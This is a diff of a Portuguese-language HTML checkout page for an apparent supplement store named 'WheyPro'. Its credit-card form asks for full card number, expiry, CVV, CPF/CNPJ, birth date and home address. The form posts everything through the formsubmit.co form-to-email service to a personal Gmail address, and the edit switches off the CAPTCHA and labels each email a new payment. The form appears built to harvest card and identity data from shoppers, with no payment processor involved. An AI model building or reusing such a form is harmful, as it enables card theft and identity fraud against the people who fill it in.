@@ -98,27 +98,32 @@
     <div class="payment-option">
         <h3>Pagar com Cartão de Crédito</h3>
         <p>Preencha seus dados abaixo e enviaremos as informações para o seu pagamento.</p>
-        <form action="https://formsubmit.co/esteticcred@gmail.com" method="post" enctype="text/plain">
-            <!-- Informações pessoais -->
-            <input type="text" name="nome" placeholder="Seu Nome" required>
-            <input type="email" name="email" placeholder="Seu Email" required>
-            <input type="text" name="cpf_cnpj" placeholder="CPF ou CNPJ" required>
-            <input type="text" name="telefone" placeholder="Número de Telefone" required>
-            <input type="text" name="data_nascimento" placeholder="Data de Nascimento" required>
-            
-            <!-- Endereço -->
-            <input type="text" name="endereco" placeholder="Endereço (Rua, Número, Bairro)" required>
-            <input type="text" name="cidade" placeholder="Cidade" required>
-            <input type="text" name="estado" placeholder="Estado" required>
-            <input type="text" name="cep" placeholder="CEP" required>
+       <form action="https://formsubmit.co/esteticcred@gmail.com" method="POST">
+    <!-- Configurações adicionais do FormSubmit -->
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_subject" value="Novo pagamento recebido via WheyPro">
+    
+    <!-- Informações pessoais -->
+    <input type="text" name="Nome" placeholder="Seu Nome" required>
+    <input type="email" name="Email" placeholder="Seu Email" required>
+    <input type="text" name="CPF/CNPJ" placeholder="CPF ou CNPJ" required>
+    <input type="text" name="Telefone" placeholder="Número de Telefone" required>
+    <input type="text" name="Data de Nascimento" placeholder="Data de Nascimento" required>
+    
+    <!-- Endereço -->
+    <input type="text" name="Endereço" placeholder="Endereço (Rua, Número, Bairro)" required>
+    <input type="text" name="Cidade" placeholder="Cidade" required>
+    <input type="text" name="Estado" placeholder="Estado" required>
+    <input type="text" name="CEP" placeholder="CEP" required>
 
-            <!-- Informações do Cartão de Crédito -->
-            <input type="text" name="numero_cartao" placeholder="Número do Cartão de Crédito" required>
-            <input type="text" name="data_vencimento" placeholder="Data de Vencimento (MM/AA)" required>
-            <input type="text" name="codigo_seguranca" placeholder="Código de Segurança (CVV)" required>
-            
-            <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
-        </form>
+    <!-- Informações do Cartão de Crédito -->
+    <input type="text" name="Número do Cartão de Crédito" placeholder="Número do Cartão de Crédito" required>
+    <input type="text" name="Data de Vencimento" placeholder="Data de Vencimento (MM/AA)" required>
+    <input type="text" name="Código de Segurança (CVV)" placeholder="Código de Segurança (CVV)" required>
+
+    <button type="submit" class="credito-button">Pagar com Cartão de Crédito</button>
+</form>
+
     </div>
 </div>
 
